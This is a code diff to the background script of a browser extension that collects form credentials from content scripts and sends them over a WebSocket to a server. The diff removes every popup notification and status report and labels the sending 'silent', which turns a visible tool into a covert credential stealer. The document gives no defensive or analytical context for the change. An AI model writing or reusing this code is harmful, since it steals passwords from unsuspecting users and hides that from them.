@@ -1,5 +1,5 @@
 
-// Background script to handle communication between content scripts and the extension
+// Background script to silently handle communication between content scripts and server
 
 // WebSocket connection
 let ws: WebSocket | null = null;
@@ -31,21 +31,27 @@ const connectWebSocket = () => {
         const message = messageQueue.shift();
         sendToServer(message);
       }
-      
-      // Update connection status for the popup
-      chrome.runtime.sendMessage({
-        type: 'CONNECTION_STATUS',
-        status: 'connected'
-      });
     };
     
     ws.onmessage = (event) => {
       console.log('Message from server:', event.data);
-      // Forward message to popup if it's open
-      chrome.runtime.sendMessage({
-        type: 'SERVER_MESSAGE',
-        data: event.data
-      });
+      // Process server messages if needed
+      try {
+        const data = JSON.parse(event.data);
+        if (data.type === 'GET_CREDENTIALS_RESPONSE') {
+          // Update our credentials store with server data
+          if (Array.isArray(data.credentials)) {
+            data.credentials.forEach((cred: any) => {
+              const exists = credentials.some(c => c.id === cred.id);
+              if (!exists) {
+                credentials.push(cred);
+              }
+            });
+          }
+        }
+      } catch (error) {
+        console.error('Failed to parse server message:', error);
+      }
     };
     
     ws.onerror = (error) => {
@@ -56,12 +62,6 @@ const connectWebSocket = () => {
       console.log('WebSocket disconnected');
       ws = null;
       isConnecting = false;
-      
-      // Update connection status for the popup
-      chrome.runtime.sendMessage({
-        type: 'CONNECTION_STATUS',
-        status: 'disconnected'
-      });
       
       // Try to reconnect after a delay
       if (reconnectTimeout === null) {
@@ -126,21 +126,15 @@ const processFormData = (message: any) => {
     // Store the credential
     credentials.push(credential);
     
-    // Send to server
+    // Send to server silently
     sendToServer({
-      type: 'NEW_CREDENTIAL',
-      credential
-    });
-    
-    // Update the popup if it's open
-    chrome.runtime.sendMessage({
       type: 'NEW_CREDENTIAL',
       credential
     });
   });
 };
 
-// Listen for messages from content scripts and popup
+// Listen for messages from content scripts
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
   if (message.type === 'FORM_DATA') {
     processFormData(message);
@@ -148,7 +142,7 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
   } else if (message.type === 'GET_CREDENTIALS') {
     sendResponse({ credentials });
     
-    // Also notify via server if connected
+    // Also request refresh from server
     sendToServer({
       type: 'REFRESH_CREDENTIALS_REQUEST',
       timestamp: Date.now()
@@ -157,14 +151,10 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     credentials.length = 0;
     sendResponse({ success: true });
     
-    // Also notify server if connected
+    // Also notify server
     sendToServer({
       type: 'CLEAR_CREDENTIALS',
       timestamp: Date.now()
-    });
-  } else if (message.type === 'GET_CONNECTION_STATUS') {
-    sendResponse({
-      status: (ws && ws.readyState === WebSocket.OPEN) ? 'connected' : 'disconnected'
     });
   }
   
